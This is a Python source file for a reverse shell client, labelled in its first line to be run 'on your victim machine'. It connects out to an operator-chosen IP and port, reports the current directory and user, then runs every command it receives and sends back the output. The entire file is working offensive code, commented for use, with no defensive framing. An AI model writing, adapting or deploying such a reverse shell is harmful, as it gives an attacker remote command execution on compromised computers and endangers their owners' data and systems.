# Execute this on your victim machine 
import socket,os,argparse,subprocess
from sys import exit
def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument('-t',help="Specify the ip address you wanna connect to !",dest="target",required=True)
    parser.add_argument('-p',help="Specify the port number to which connect to !",dest="port",default=1337,type=int)
    return parser.parse_args()
def execute_cmd(s):
    # Remember at first before accepting and recieving connections, it was reciveing host name and whoami , so now we will send those firstly to make the termina!
    s.send(os.getcwd().encode())
    s.send(subprocess.getoutput('whoami').encode())
    while True:
        try:
            # recieving the data and decoding data and striping the whitespaces around the data 
            cmd=s.recv(bufferSize).decode().strip()
            # if command comes as quit we will break the loop and close connection! 
            if cmd.lower()=='quit':
                break
            # Spliting the command in a list for changing directory issues 
            cmd_split=cmd.split()
            # if command is cd then we will use os module to perform change of directory
            if cmd_split[0].lower()=='cd':
                try:
                    os.chdir(' '.join(cmd_split[1:]))
                except FileNotFoundError as e:
                    output=str(e)
                else:
                    output=""

            else:
                output=subprocess.getoutput(cmd)

            # sending the data with some separator in between so that on the server side we could parse data by spliting 
            s.send(f"{output}{Separator}{os.getcwd()}{Separator}{subprocess.getoutput('whoami')}".encode())
        except KeyboardInterrupt:
            s.close()
        except:
            pass 
    s.close()
def create_socket(host,port):
    
    try:
    # creating the socket object     
        s=socket.socket()
        # Direct connecting to the host 
        s.connect((host,port))
        
        execute_cmd(s)
    except socket.error as err:
        print(f"[-] Error occured at socket processing, Reason {err}",'red')
if __name__=="__main__":
    arguments=get_args()
    host=arguments.target
    port=arguments.port
    bufferSize=1024 * 256 # for 256kb messages buffer
    Separator = "<sep>"
    create_socket(host,port)